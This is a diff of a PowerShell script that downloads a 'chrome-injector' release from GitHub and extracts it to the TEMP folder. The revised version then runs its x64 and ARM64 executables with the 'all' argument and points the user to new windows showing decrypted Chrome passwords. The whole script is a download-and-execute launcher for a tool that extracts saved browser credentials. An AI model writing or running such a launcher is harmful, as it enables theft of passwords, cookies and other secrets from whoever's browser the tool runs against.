@@ -1,126 +1,87 @@
-# Download and Extract Chrome Decryption Tool
+# Chrome Decryption Tool - Download & Execute
 # ===========================================
 
 # Configuration
 $zipUrl = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.17.3/chrome-injector-v0.17.3.zip"
-$tempDir = "$env:TEMP\ChromeDecryptor"
-$extractDir = "$env:TEMP\ChromeDecryptor\Extracted"
-$zipPath = "$env:TEMP\ChromeDecryptor\chrome-injector.zip"
+$extractPath = "$env:TEMP\ChromeDecryptor"
 
-Write-Host "🔧 Chrome Decryption Tool Downloader" -ForegroundColor Cyan
-Write-Host "====================================" -ForegroundColor Cyan
+Write-Host "🔓 Chrome Password Decryption Tool" -ForegroundColor Cyan
+Write-Host "==================================" -ForegroundColor Cyan
 
-# Create temp directory
-Write-Host "`n📁 Creating directories..." -ForegroundColor Yellow
-if (-not (Test-Path $tempDir)) {
-    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
-    Write-Host "✓ Created: $tempDir" -ForegroundColor Green
+# STEP 1: DOWNLOAD
+Write-Host "`n⬇️  Downloading tool..." -ForegroundColor Yellow
+$zipFile = "$extractPath\chrome.zip"
+
+# Create folder
+if (-not (Test-Path $extractPath)) {
+    New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
 }
 
-if (-not (Test-Path $extractDir)) {
-    New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
-    Write-Host "✓ Created: $extractDir" -ForegroundColor Green
-}
-
-# Download the file
-Write-Host "`n⬇️  Downloading Chrome decryption tool..." -ForegroundColor Yellow
-Write-Host "  From: $zipUrl" -ForegroundColor Gray
-Write-Host "  To: $zipPath" -ForegroundColor Gray
-
+# Download
 try {
-    # Download with progress
-    $ProgressPreference = 'SilentlyContinue'
-    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
-    
-    # Verify download
-    if (Test-Path $zipPath) {
-        $fileSize = (Get-Item $zipPath).Length / 1MB
-        Write-Host "✅ Download complete!" -ForegroundColor Green
-        Write-Host "  File size: $($fileSize.ToString('0.00')) MB" -ForegroundColor Cyan
-    } else {
-        Write-Host "❌ Download failed - file not found" -ForegroundColor Red
-        exit 1
-    }
+    Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile -UseBasicParsing
+    Write-Host "✅ Download complete" -ForegroundColor Green
 } catch {
-    Write-Host "❌ Download error: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "❌ Download failed: $($_.Exception.Message)" -ForegroundColor Red
     exit 1
 }
 
-# Extract the zip file
+# STEP 2: EXTRACT
 Write-Host "`n📦 Extracting files..." -ForegroundColor Yellow
-
 try {
-    # Extract using Expand-Archive (PowerShell 5.1+)
-    Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
-    
-    # Count extracted files
-    $extractedFiles = Get-ChildItem -Path $extractDir -Recurse -File
-    $extractedFolders = Get-ChildItem -Path $extractDir -Recurse -Directory
-    
-    Write-Host "✅ Extraction complete!" -ForegroundColor Green
-    Write-Host "  Files: $($extractedFiles.Count)" -ForegroundColor Cyan
-    Write-Host "  Folders: $($extractedFolders.Count)" -ForegroundColor Cyan
-    
+    Expand-Archive -Path $zipFile -DestinationPath $extractPath -Force
+    Remove-Item $zipFile -Force
+    Write-Host "✅ Extraction complete" -ForegroundColor Green
 } catch {
-    Write-Host "❌ Extraction error: $($_.Exception.Message)" -ForegroundColor Red
-    Write-Host "  Trying alternative method..." -ForegroundColor Yellow
-    
-    # Alternative: Use .NET if Expand-Archive fails
-    try {
-        Add-Type -AssemblyName System.IO.Compression.FileSystem
-        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractDir)
-        Write-Host "✅ Extraction successful (alternative method)" -ForegroundColor Green
-    } catch {
-        Write-Host "❌ Both extraction methods failed" -ForegroundColor Red
-        exit 1
-    }
+    Write-Host "❌ Extraction failed: $($_.Exception.Message)" -ForegroundColor Red
+    exit 1
 }
 
-# Show extracted contents
-Write-Host "`n📋 Extracted contents:" -ForegroundColor Yellow
-$rootItems = Get-ChildItem -Path $extractDir
-foreach ($item in $rootItems) {
-    if ($item.PSIsContainer) {
-        Write-Host "  📁 $($item.Name)" -ForegroundColor Cyan
-    } else {
-        Write-Host "  📄 $($item.Name)" -ForegroundColor Green
-    }
+# STEP 3: FIND EXECUTABLES
+Write-Host "`n🔍 Finding executables..." -ForegroundColor Yellow
+Set-Location $extractPath
+
+$arm64Exe = Get-ChildItem -Filter "*arm64.exe" -Recurse | Select-Object -First 1
+$x64Exe = Get-ChildItem -Filter "*x64.exe" -Recurse | Select-Object -First 1
+
+if (-not $arm64Exe -and -not $x64Exe) {
+    Write-Host "❌ No executables found in: $extractPath" -ForegroundColor Red
+    Write-Host "Contents:" -ForegroundColor Yellow
+    Get-ChildItem -Path $extractPath -Recurse | Format-Table Name
+    exit 1
 }
 
-# Save folder path to variable
-$chromeDecryptorPath = $extractDir
-Write-Host "`n📍 Folder path saved to variable:" -ForegroundColor Yellow
-Write-Host "  `$chromeDecryptorPath = '$chromeDecryptorPath'" -ForegroundColor Cyan
+Write-Host "Found:" -ForegroundColor Green
+if ($arm64Exe) { Write-Host "  • $($arm64Exe.Name)" -ForegroundColor Cyan }
+if ($x64Exe) { Write-Host "  • $($x64Exe.Name)" -ForegroundColor Cyan }
 
-# Also save to environment variable for later use
-[Environment]::SetEnvironmentVariable("CHROME_DECRYPTOR_PATH", $extractDir, "User")
-Write-Host "  Environment variable set: CHROME_DECRYPTOR_PATH" -ForegroundColor Gray
+# STEP 4: EXECUTE
+Write-Host "`n🚀 Executing decryption tools..." -ForegroundColor Magenta
 
-# Show full path in clipboard (optional)
-$chromeDecryptorPath | Set-Clipboard
-Write-Host "  Path copied to clipboard" -ForegroundColor Gray
-
-# Test if the tool works
-Write-Host "`n🔍 Testing the tool..." -ForegroundColor Yellow
-$exeFiles = Get-ChildItem -Path $extractDir -Recurse -Filter "*.exe"
-if ($exeFiles.Count -gt 0) {
-    Write-Host "✅ Found executable files:" -ForegroundColor Green
-    foreach ($exe in $exeFiles) {
-        Write-Host "  → $($exe.Name)" -ForegroundColor Cyan
-    }
-} else {
-    Write-Host "⚠️  No executable files found" -ForegroundColor Yellow
+# Execute x64
+if ($x64Exe) {
+    Write-Host "`n🔧 Running $($x64Exe.Name) all..." -ForegroundColor Yellow
+    Write-Host "="*50 -ForegroundColor Cyan
+    Start-Process powershell.exe -ArgumentList "-NoExit", "-Command", "cd '$extractPath'; .\$($x64Exe.Name) all" -WindowStyle Normal
+    Write-Host "✅ x64 started in new window" -ForegroundColor Green
 }
 
-# Summary
+# Execute ARM64
+if ($arm64Exe) {
+    Write-Host "`n🔧 Running $($arm64Exe.Name) all..." -ForegroundColor Yellow
+    Write-Host "="*50 -ForegroundColor Cyan
+    Start-Process powershell.exe -ArgumentList "-NoExit", "-Command", "cd '$extractPath'; .\$($arm64Exe.Name) all" -WindowStyle Normal
+    Write-Host "✅ ARM64 started in new window" -ForegroundColor Green
+}
+
+# STEP 5: SUMMARY
 Write-Host "`n" + "="*50 -ForegroundColor Cyan
 Write-Host "📊 SUMMARY" -ForegroundColor Cyan
 Write-Host "="*50 -ForegroundColor Cyan
-Write-Host "• Download URL: $zipUrl" -ForegroundColor Gray
-Write-Host "• Temp folder: $tempDir" -ForegroundColor Gray
-Write-Host "• Extract folder: $extractDir" -ForegroundColor Gray
-Write-Host "• Files extracted: $(Get-ChildItem -Path $extractDir -Recurse -File | Measure-Object | Select-Object -ExpandProperty Count)" -ForegroundColor Gray
-Write-Host "• Folder size: $([math]::Round((Get-ChildItem -Path $extractDir -Recurse | Measure-Object -Property Length -Sum).Sum / 1MB, 2)) MB" -ForegroundColor Gray
-Write-Host "• Path variable: `$chromeDecryptorPath" -ForegroundColor Cyan
+Write-Host "• Tool folder: $extractPath" -ForegroundColor Gray
+Write-Host "• x64 executed: $(if($x64Exe){'Yes'}else{'No'})" -ForegroundColor Gray
+Write-Host "• ARM64 executed: $(if($arm64Exe){'Yes'}else{'No'})" -ForegroundColor Gray
+Write-Host "• Windows opened: $(if($x64Exe -and $arm64Exe){'2'}elseif($x64Exe -or $arm64Exe){'1'}else{'0'})" -ForegroundColor Gray
 
-Write-Host "`n✅ Chrome decryption tool ready to use!" -ForegroundColor Green
+Write-Host "`n✅ Chrome decryption tools running!" -ForegroundColor Green
+Write-Host "Check the new PowerShell windows for decrypted passwords." -ForegroundColor Gray
